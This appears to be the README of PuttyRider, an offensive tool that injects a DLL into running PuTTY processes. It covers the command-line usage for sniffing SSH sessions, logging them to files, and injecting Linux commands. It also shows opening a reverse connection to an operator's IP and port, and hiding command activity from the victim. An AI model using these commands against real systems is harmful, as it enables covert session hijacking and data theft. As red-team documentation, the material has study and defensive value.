PuttyRider
==========
Hijack Putty sessions in order to sniff conversation and inject Linux commands.

Download
========
[PuttyRider-bin.zip](https://github.com/seastorm/PuttyRider/releases/download/0.1/PuttyRider-bin.zip)


Documentation
=============
* [Defcamp 2014 presentation - pdf](http://defcamp.ro/dc14/AdrianFurtuna.pdf)
* [Defcamp 2014 presentation - video](https://www.youtube.com/watch?v=nfhzoFPGUhg&list=UUc05xgnkf4YZEdn3zBJRFkA)

Examples
========
List existing Putty processes and their status (injected / not injected)

    PuttyRider.exe -l

Inject DLL into the first found putty.exe and initiate a reverse connection from DLL to my IP:Port, then exit PuttyRider.exe.

    PuttyRider.exe -p 0 -r 192.168.0.55:8080

Run in background and wait for new Putty processes. Inject in any new putty.exe and write all conversations in local files. 

    PuttyRider.exe -w -f

Eject PuttyRider.dll from all Putty processes where it is already injected. 
(Don't forget to kill PuttyRider.exe if running in -w mode, otherwise it will reinject again.)

    PuttyRider.exe -x
    
Usage
=====
	Operation modes:
		-l		List the running Putty processes and their connections
		-w		Inject in all existing Putty sessions and wait for new sessions
				to inject in those also
		-p PID  Inject only in existing Putty session identified by PID.
				If PID==0, inject in the first Putty found
		-x		Cleanup. Remove the DLL from all running Putty instances
		-d		Debug mode. Only works with -p mode
		-c CMD  Automatically execute a Linux command after successful injection
				PuttyRider will remove trailing spaces and '&' character from CMD
				PuttyRider will add: " 1>/dev/null 2>/dev/null &" to CMD
		-h		Print this help

	Output modes:
		-f			Write all Putty conversation to a file in the local directory.
					The filename will have the PID of current putty.exe appended
		-r IP:PORT	Initiate a reverse connection to the specified machine and
					start an interactive session.

	Interactive commands (after you receive a reverse connection):
		!status		See if the Putty window is connected to user input
		!discon		Disconnect the main Putty window so it won't display anything
					This is useful to send commands without the user to notice
		!recon		Reconnect the Putty window to its normal operation mode
		CMD			Linux shell commands
		!exit		Terminate this connection
		!help		Display help for client connection

		
Compiling
=========
Use Visual Studio Command Prompt:

	nmake main dll

Acknowledgements
================
Thanks to Brett Moore of Insomnia Security for his proof of concept [PuttyHijack](https://www.insomniasec.com/downloads/tools/PuttyHijackV1.0.rar)


